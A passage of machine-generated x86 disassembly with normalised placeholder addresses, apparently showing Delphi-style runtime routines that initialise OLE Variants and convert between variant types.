fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411d28
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411e84
fistp [ esp ]
fwait
jmp r-xdata
sub_412250
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40465c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ee7c
pop ebx
pop ebp
retn 0x8
sub_412288
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40465c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ee7c
pop ebx
pop ebp
retn 0x8
sub_4122c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412376
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40465c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ee7c
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41237d
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fa0
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404204
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407edc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4047a8
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404204
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407ea0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4047a8
jmp r-xdata
jmp r-xdata
call sub_40ea84
sub_412384
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412443
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412421
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ee7c
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_40476c
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404858
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404204
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412428
lea eax [ ebp - 0x10 ]
call sub_40f220
retn
sub_412450
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4124a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f548
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4124ad
lea eax [ ebp - 0x10 ]
call sub_40f220
retn
sub_4124b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414940
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412529
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f220
retn
sub_412538
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412a6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412571 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fd0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f7c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403fd0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403fd0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40979c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fd0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40979c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403fd0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412250
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404204
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412288
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404204
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_40476c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404858
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404204
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_4122c0
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404204
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403fd0
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403fd0
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_4082a8
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403fd0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_4082a8
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412538
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412384
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403fd0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a76
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403fa0
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404674
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403fa0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404674
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fa0
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_412450
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403fd0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403fd0
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e9e8
test ah 0x40
je r-xdata
mov eax esi
call sub_403f7c
mov edx eax
mov eax ebx
call sub_4124b4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_412384
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403fd0
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412384
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403fd0
jmp r-xdata
jmp [ eax * 4 + jump_table_412805 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403fd0
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40979c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40979c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412250
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404204
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_412288
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404204
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4041a4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4122c0
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404204
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403fd0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403fd0
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_4082a8
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_4082a8
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403fd0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412538
jmp r-xdata
sub_412a7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412b26
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412b09
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ee7c
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_40476c
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b10
lea eax [ ebp - 0x10 ]
call sub_40f220
retn
sub_412b34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412b8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f548
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412c60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b91
lea eax [ ebp - 0x10 ]
call sub_40f220
retn
sub_412b98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412c50
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414940
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c57
lea eax [ ebp - 0x20 ]
call sub_40465c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412c33
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40476c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f220
retn
sub_412c60
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4131b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412c9a ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4047a8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40465c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047a8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047a8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40979c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047a8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40979c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4047a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412250
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404698
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412288
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404698
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_40476c
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404858
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_4122c0
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404698
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4047a8
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4047a8
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_4081bc
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4082a8
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4047a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_4082a8
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412c60
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412a7c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404698
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131b9
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404674
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403fa0
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404674
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403fa0
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404674
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403fa0
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404674
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fa0
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412b34
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404698
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4047a8
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e9e8
test ah 0x40
je r-xdata
mov eax esi
call sub_40465c
mov edx eax
mov eax ebx
call sub_412b98
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412a7c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404698
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412a7c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404698
jmp r-xdata
jmp [ eax * 4 + jump_table_412f21 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4047a8
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40979c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40979c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_412250
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404698
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412288
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404698
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4122c0
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404698
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4047a8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4047a8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081bc
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_4082a8
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_4082a8
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4047a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412c60
jmp r-xdata
sub_4131c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41322a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f548
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4058b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413231
lea eax [ ebp - 0x10 ]
call sub_40f220
retn
mov dx 0xd
mov ax 0x101
call sub_40e9e8
sub_413238
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_4131c0
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4058b8
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4058b8
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_4058a0
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414940
test al al
je r-xdata
mov eax esi
call sub_4058a0
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e9e8
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e9e8
mov eax esi
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4032a0
test al al
jne r-xdata
sub_413304
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_4058a0
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_4058a0
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e9e8
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4058b8
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4058b8
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414940
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e9e8
mov eax esi
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4032a0
test al al
jne r-xdata
sub_4133b0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f1a4
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_4133ec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_41340c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f1a4
sub_41342c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_41344c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_41346c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f1a4
sub_41348c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_4134ac
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1a4
sub_4134d8
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f1a4
sub_4134fc
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1a4
sub_413528
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1a4
sub_413554
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1a4
sub_413580
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
